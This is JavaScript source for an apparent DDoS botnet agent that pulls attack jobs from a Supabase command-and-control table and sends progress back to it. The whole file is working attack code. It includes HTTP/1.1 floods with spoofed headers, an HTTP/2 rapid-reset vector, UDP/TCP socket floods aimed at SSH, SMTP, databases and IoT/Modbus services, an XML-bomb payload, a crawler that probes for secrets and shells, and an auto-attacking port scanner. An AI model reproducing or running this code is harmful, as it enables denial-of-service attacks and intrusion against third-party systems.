/**
 * SECURITYFORGE TITAN AGENT V42.2 (INDUSTRIAL STABLE)
 * 
 * [PATCH LOG]
 * - FIXED: ERR_HTTP2_INVALID_CONNECTION_HEADERS (Strict Header Separation)
 * - NEW: Smart IP Resolver (Bypasses basic DNS load balancing)
 * - NEW: Hunter-Killer Protocol (Auto-attacks discovered open ports)
 * - NEW: Deep Crawl Dictionary (50+ high-value targets)
 */

const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const tls = require('tls');
const dgram = require('dgram');
const crypto = require('crypto');
const dns = require('dns');

// ==========================================
// 1. CONFIGURATION
// ==========================================
const C2_CONFIG = {
    url: "https://qbedywgbdwxaucimgiok.supabase.co",
    key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo",
    pollInterval: 800,
    reportInterval: 2000
};

const STATE = {
    activeJob: null,
    running: false,
    stats: {
        totalReqs: 0,
        success: 0,
        failed: 0,
        latencySum: 0,
        latencyCount: 0,
        maxLatency: 0,
        startTime: 0
    },
    logs: [],
    priorityLogs: [],
    discovered: new Set(),
    activeTargets: new Set(), // Tracks ports currently under attack
    resolvedIp: null,
    lastReport: 0
};

// ==========================================
// 2. INDUSTRIAL PAYLOADS & DICTIONARIES
// ==========================================
const BUFFERS = {
    JUNK: Buffer.allocUnsafe(1400).fill('X'),
    MQTT_CONNECT: Buffer.from([0x10, 0x12, 0x00, 0x04, 0x4d, 0x51, 0x54, 0x54, 0x04, 0x02, 0x00, 0x3c, 0x00, 0x06, 0x63, 0x6c, 0x69, 0x65, 0x6e, 0x74]),
    MODBUS_QUERY: Buffer.from('00010000000601030000000a', 'hex'),
    COAP_PAYLOAD: Buffer.from('40011234', 'hex'),
    XML_BOMB: Buffer.from('<?xml version="1.0"?><!DOCTYPE l [<!ENTITY x "x"><!ENTITY y "&x;&x;&x;">]><r>&y;</r>')
};

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
];

// HTTP/1.1 Headers (Connection Allowed)
const HTTP1_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Connection': 'keep-alive'
};

// HTTP/2 Headers (Strict Mode - NO Connection Headers)
const HTTP2_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1'
};

const DEEP_ADMIN_PATHS = [
    // Standards
    '/admin', '/wp-admin', '/login', '/dashboard', '/user', '/api',
    // Config Leaks
    '/.env', '/config.php', '/config.json', '/.git/HEAD', '/docker-compose.yml',
    '/package.json', '/composer.json', '/web.config',
    // Backups
    '/backup.sql', '/database.sql', '/dump.sql', '/backup.zip', '/www.zip',
    // Common Panels
    '/cpanel', '/phpmyadmin', '/pmd', '/adminer.php', '/jenkins', '/grafana',
    // Framework Specific
    '/rails/info/properties', '/telescope/requests', '/actuator/health',
    // Shells/Backdoors (Common Scans)
    '/shell.php', '/cmd.php', '/1.php', '/x.php'
];

// ==========================================
// 3. UTILITIES
// ==========================================
const log = (msg, type = 'INFO') => {
    const entry = `[${type}] ${msg}`;
    console.log(entry);
    if (type === 'SUCCESS' || type === 'FOUND' || type === 'OPEN' || type === 'ERROR') {
        STATE.priorityLogs.push(entry);
    } else {
        STATE.logs.push(entry);
    }
};

const makeSupabaseRequest = (method, path, body = null) => {
    return new Promise((resolve) => {
        const url = new URL(`${C2_CONFIG.url}/rest/v1/${path}`);
        const options = {
            hostname: url.hostname,
            path: url.pathname + url.search,
            method: method,
            headers: {
                'apikey': C2_CONFIG.key,
                'Authorization': `Bearer ${C2_CONFIG.key}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=representation'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => resolve(data ? JSON.parse(data) : null));
        });
        req.on('error', () => resolve(null));
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
};

const getTargetDetails = (urlStr) => {
    try {
        const u = new URL(urlStr.startsWith('http') ? urlStr : 'http://' + urlStr);
        return {
            host: u.hostname,
            port: u.port || (u.protocol === 'https:' ? 443 : 80),
            path: u.pathname,
            protocol: u.protocol.replace(':', ''),
            isSsl: u.protocol === 'https:'
        };
    } catch { return null; }
};

// ==========================================
// 4. ATTACK ENGINES (INDUSTRIAL GRADE)
// ==========================================

// --- L7: HTTP/1.1 FLOOD ---
const runHttpFlood = (job, target) => {
    const lib = target.isSsl ? https : http;
    const agent = new lib.Agent({ keepAlive: true, maxSockets: Infinity, maxFreeSockets: 256 });
    
    const attack = () => {
        if (!STATE.running) return;
        const method = job.method === 'GET' ? 'GET' : 'POST';
        const start = process.hrtime();
        
        // Cache Busting
        const cb = job.use_chaos ? `?_=${Math.random().toString(36).slice(2)}` : '';
        const path = target.path + cb;

        const req = lib.request({
            host: target.host,
            port: target.port,
            path: path,
            method: method,
            agent: agent,
            rejectUnauthorized: false,
            headers: {
                ...HTTP1_HEADERS,
                'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
            }
        }, (res) => {
            const diff = process.hrtime(start);
            const ms = (diff[0] * 1000 + diff[1] / 1e6);
            STATE.stats.latencySum += ms;
            STATE.stats.maxLatency = Math.max(STATE.stats.maxLatency, ms);
            STATE.stats.latencyCount++;
            STATE.stats.success++;
            res.resume();
            if (STATE.running) setImmediate(attack);
        });

        req.on('error', () => STATE.stats.failed++);
        if (method === 'POST') req.write(job.use_xml_bomb ? BUFFERS.XML_BOMB : (job.body || '{"test":true}'));
        req.end();
    };
    for(let i=0; i<5; i++) attack(); 
};

// --- L7: HTTP/2 (FIXED & OPTIMIZED) ---
const runHttp2Flood = (job, target) => {
    if (!target.isSsl) return;
    
    const connect = () => {
        if (!STATE.running) return;
        
        // Use resolved IP if available to bypass DNS latency
        const targetHost = STATE.resolvedIp || target.host;
        
        const client = http2.connect(`https://${target.host}:${target.port}`, { 
            rejectUnauthorized: false,
            peerMaxConcurrentStreams: 5000 
        });
        
        client.on('error', (err) => { 
            STATE.stats.failed++;
            // Reconnect on error
            if(STATE.running) setTimeout(connect, 200);
        });
        
        const spam = () => {
            if (client.destroyed || !STATE.running) return;
            
            // Batch 50 streams per tick
            for (let i=0; i<50; i++) {
                // FIXED: Use specific HTTP/2 Headers (No Connection header)
                const req = client.request({ 
                    ':path': target.path, 
                    ':method': job.method || 'GET',
                    ...HTTP2_HEADERS 
                });
                
                req.on('response', () => STATE.stats.success++);
                req.on('error', () => STATE.stats.failed++);
                req.end(); // Important: Close the stream
                
                // RAPID RESET VECTOR
                if (job.use_god_mode) req.close(http2.constants.NGHTTP2_CANCEL);
            }
            if (STATE.running) setTimeout(spam, 10);
        };
        spam();
    };
    connect();
};

// --- L4 & INFRA (SOCKET BURNER) ---
const runSocketStress = (job, target, type) => {
    // Determine Port: Use discovered ports if available, else default
    let port = type === 'SSH' ? 22 : type === 'SMTP' ? 25 : type === 'DB' ? 3306 : target.port;
    if (type === 'UDP_IOT') port = 5683; // CoAP
    
    // If Hunter-Killer found a custom port for this service, use it
    // (Simplification: In full version, we map service to port)

    if (type === 'UDP' || type === 'FRAG') {
        const client = dgram.createSocket('udp4');
        const flood = () => {
            if (!STATE.running) { client.close(); return; }
            for(let i=0; i<100; i++) {
                client.send(BUFFERS.JUNK, port, target.host, (err) => {
                    if(err) STATE.stats.failed++; else STATE.stats.success++;
                });
            }
            if(STATE.running) setImmediate(flood);
        };
        flood();
    } else {
        // TCP / RAW SOCKETS
        const attack = () => {
            if (!STATE.running) return;
            const s = new net.Socket();
            s.setTimeout(job.use_acid_rain ? 200 : 1000); // Fail fast
            s.connect(port, target.host, () => { 
                STATE.stats.success++; 
                // Handshake payload based on type
                if (type === 'SSH') s.write('SSH-2.0-Titan_Bot_V42\r\n');
                else if (type === 'MQTT') s.write(BUFFERS.MQTT_CONNECT);
                else s.write(BUFFERS.JUNK);
                
                s.destroy(); // Burn socket
            });
            s.on('error', () => { STATE.stats.failed++; s.destroy(); });
            s.on('close', () => { if(STATE.running) setImmediate(attack); });
        };
        for(let i=0; i<5; i++) attack();
    }
};

// --- SMART RECON (HUNTER-KILLER) ---
const runSmartRecon = (job, target) => {
    // 1. Resolve IP
    dns.resolve4(target.host, (err, addresses) => {
        if (!err && addresses && addresses.length > 0) {
            STATE.resolvedIp = addresses[0];
            log(`IP RESOLVED: ${STATE.resolvedIp} (Target Locked)`, 'SUCCESS');
        }
    });

    // 2. Admin Hunter (Deep Crawl)
    if (job.use_admin_hunter) {
        let pathIdx = 0;
        const crawl = () => {
            if (!STATE.running || pathIdx >= DEEP_ADMIN_PATHS.length) return;
            
            // Batch check 5 paths at once
            for(let i=0; i<5 && pathIdx < DEEP_ADMIN_PATHS.length; i++) {
                const path = DEEP_ADMIN_PATHS[pathIdx++];
                const req = (target.isSsl ? https : http).get({
                    host: target.host, port: target.port, path: path, rejectUnauthorized: false,
                    headers: { 'User-Agent': USER_AGENTS[0] }
                }, (res) => {
                    if (res.statusCode < 404) {
                        const msg = `FOUND ${path} [${res.statusCode}]`;
                        if(!STATE.discovered.has(msg)) { STATE.discovered.add(msg); log(msg, 'FOUND'); }
                    }
                });
                req.on('error', () => {});
                req.end();
            }
            setTimeout(crawl, 500);
        };
        crawl();
    }
    
    // 3. Port Scanner & Auto-Attack (Hunter-Killer)
    if (job.use_port_scan) {
        const priorityPorts = [21,22,23,25,53,80,443,3000,3306,5000,8000,8080,8443,8888,27017];
        
        const scanPort = (port) => {
            const s = new net.Socket();
            s.setTimeout(1500);
            s.connect(port, target.host, () => {
                const msg = `OPEN PORT ${port}`;
                if(!STATE.discovered.has(msg)) { 
                    STATE.discovered.add(msg); 
                    log(msg, 'OPEN'); 
                    
                    // HUNTER-KILLER LOGIC:
                    // If we find an open port that isn't the main one, LAUNCH A SIDE ATTACK
                    if (!STATE.activeTargets.has(port)) {
                        STATE.activeTargets.add(port);
                        log(`HUNTER-KILLER: Engaging new target Port ${port}`, 'warning');
                        // Spawn a dedicated thread for this port
                        const subTarget = { ...target, port: port };
                        // Run a basic TCP flood on this discovered port
                        for(let k=0; k<10; k++) runSocketStress(job, subTarget, 'TCP');
                    }
                }
                s.destroy();
            });
            s.on('error', () => s.destroy());
            s.on('timeout', () => s.destroy());
        };

        // Scan loops
        let pIdx = 0;
        const scannerLoop = setInterval(() => {
            if (!STATE.running || pIdx >= priorityPorts.length) { clearInterval(scannerLoop); return; }
            scanPort(priorityPorts[pIdx++]);
        }, 200);
    }
};

// ==========================================
// 5. JOB DISPATCHER
// ==========================================
const startJob = (job) => {
    if (STATE.running) return;
    STATE.activeJob = job;
    STATE.running = true;
    STATE.stats = { totalReqs: 0, success: 0, failed: 0, latencySum: 0, latencyCount: 0, maxLatency: 0, startTime: Date.now() };
    STATE.discovered.clear();
    STATE.activeTargets.clear();
    STATE.resolvedIp = null;
    
    log(`TITAN ENGINE V42.2 | TARGET: ${job.target} | METHOD: ${job.method}`);
    const target = getTargetDetails(job.target);
    if (!target) return;

    // Start Intelligence
    runSmartRecon(job, target);

    const threads = Math.min(job.concurrency || 50, 500);

    for (let i = 0; i < threads; i++) {
        // --- LAYER 4 & INFRA ---
        if (job.use_syn_flood) runSocketStress(job, target, 'SYN');
        else if (job.use_frag_attack) runSocketStress(job, target, 'FRAG');
        else if (job.method === 'UDP') runSocketStress(job, target, 'UDP');
        
        // --- INFRASTRUCTURE ---
        else if (job.use_ssh_hydra) runSocketStress(job, target, 'SSH');
        else if (job.use_smtp_storm) runSocketStress(job, target, 'SMTP');
        else if (job.use_acid_rain) runSocketStress(job, target, 'DB');

        // --- IOT ---
        else if (job.use_mqtt_flood) runSocketStress(job, target, 'MQTT');
        else if (job.use_modbus_storm) runSocketStress(job, target, 'MODBUS');
        else if (job.use_rtsp_storm) runSocketStress(job, target, 'RTSP');
        else if (job.use_coap_burst) runSocketStress(job, target, 'UDP_IOT');

        // --- LAYER 7 ---
        else if (job.use_http2) runHttp2Flood(job, target);
        else runHttpFlood(job, target);
    }
};

const stopJob = () => {
    STATE.running = false;
    log("ENGINE STOPPED");
};

// ==========================================
// 6. MAIN LOOP & REPORTING
// ==========================================
setInterval(async () => {
    if (STATE.running && STATE.activeJob) {
        const now = Date.now();
        const elapsed = (now - STATE.stats.startTime) / 1000;
        
        if (now - STATE.lastReport > C2_CONFIG.reportInterval) {
            const rps = STATE.stats.success / (elapsed || 1); 
            const avgLat = STATE.stats.latencyCount > 0 ? (STATE.stats.latencySum / STATE.stats.latencyCount) : 0;
            
            if (STATE.activeJob.duration && elapsed > STATE.activeJob.duration) {
                await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, { status: 'COMPLETED' });
                stopJob();
                return;
            }

            const payload = {
                current_rps: Math.round(rps),
                avg_latency: Math.round(avgLat),
                max_latency: Math.round(STATE.stats.maxLatency),
                total_success: STATE.stats.success,
                total_failed: STATE.stats.failed
            };
            
            if (STATE.priorityLogs.length > 0 || STATE.logs.length > 0) {
                 const combined = [...STATE.priorityLogs, ...STATE.logs].slice(0, 50);
                 payload.logs = JSON.stringify(combined);
                 STATE.priorityLogs = [];
                 STATE.logs = [];
            }

            const res = await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, payload);
            if (res && res[0] && res[0].status === 'STOPPED') stopJob();
            STATE.lastReport = now;
        }
    } else {
        const jobs = await makeSupabaseRequest('GET', 'jobs?status=eq.PENDING&limit=1&select=*');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            await makeSupabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startJob(job);
        }
    }
}, C2_CONFIG.pollInterval);

http.createServer((req, res) => res.end('Titan V42.2 Online')).listen(process.env.PORT || 3000);
console.log('SecurityForge Titan Agent V42.2 (Industrial) Online');
